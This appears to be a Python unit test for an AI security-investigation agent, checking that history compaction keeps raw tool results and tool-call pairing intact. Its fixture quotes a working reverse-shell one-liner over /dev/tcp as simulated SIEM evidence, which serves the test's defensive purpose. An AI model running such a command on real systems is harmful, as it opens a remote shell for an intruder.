"""
Offline test: context compaction never summarizes away the current task's tool
results. The raw tool output (e.g. a reverse shell in a SIEM result) must survive
into the step where the model writes its report, or the evidence is lost.

Run from project root with:
    python -m pytest tests/unit/graph/test_compaction_preserves_tool_messages.py
"""
from __future__ import annotations

import os
import sys
import tempfile
import unittest

project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, project_root)
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "aci.settings")
os.environ["SECRET_KEY"] = "test"
os.environ["TASKQUEUE_DB_PATH"] = tempfile.mktemp(suffix=".db")
os.environ["BOARD_DB_PATH"] = tempfile.mktemp(suffix=".db")

import django
django.setup()

from langchain_core.messages import AIMessage, HumanMessage, SystemMessage, ToolMessage
from agent.runtime.graph.toolio import _compact_history

REVSHELL = "events: user ran `sh -i >& /dev/tcp/10.0.2.5/5555 0>&1` (event _id=abc123)"


class StubBound:
    def __init__(self):
        self.calls = 0

    async def ainvoke(self, messages, **kwargs):
        self.calls += 1
        return AIMessage(content="[summary of narration]")


def _history():
    return [
        SystemMessage(content="system prompt"),
        HumanMessage(content="task brief: investigate the cron alert"),
        AIMessage(content="", tool_calls=[{"id": "t1", "name": "search", "args": {}}]),
        ToolMessage(content=REVSHELL, tool_call_id="t1", name="search"),
        AIMessage(content="I see suspicious cron activity, checking further."),
        AIMessage(content="", tool_calls=[{"id": "t2", "name": "search", "args": {}}]),
        ToolMessage(content="other benign result", tool_call_id="t2", name="search"),
        AIMessage(content="Continuing analysis."),
    ]


class CompactionTests(unittest.IsolatedAsyncioTestCase):
    async def test_tool_results_survive_compaction(self):
        bound = StubBound()
        out = await _compact_history(_history(), bound, "investigation")

        # The reverse-shell tool result must still be present verbatim.
        tool_contents = [m.content for m in out if isinstance(m, ToolMessage)]
        self.assertTrue(
            any("/dev/tcp/10.0.2.5/5555" in c for c in tool_contents),
            "reverse shell tool result was compacted away",
        )
        # Compaction still happened: a prior-context summary replaced free text.
        self.assertTrue(
            any(isinstance(m, HumanMessage) and "[Prior context summary]" in (m.content or "")
                for m in out),
            "expected a summary message to replace narration",
        )
        self.assertEqual(bound.calls, 1)

    async def test_tool_call_pairing_preserved(self):
        out = await _compact_history(_history(), StubBound(), "investigation")
        call_ids = {
            tc["id"]
            for m in out
            for tc in (getattr(m, "tool_calls", None) or [])
        }
        tool_ids = {m.tool_call_id for m in out if isinstance(m, ToolMessage)}
        # Every surviving ToolMessage has its calling AIMessage retained.
        self.assertTrue(tool_ids.issubset(call_ids), "orphaned ToolMessage after compaction")


if __name__ == "__main__":
    unittest.main(verbosity=2)
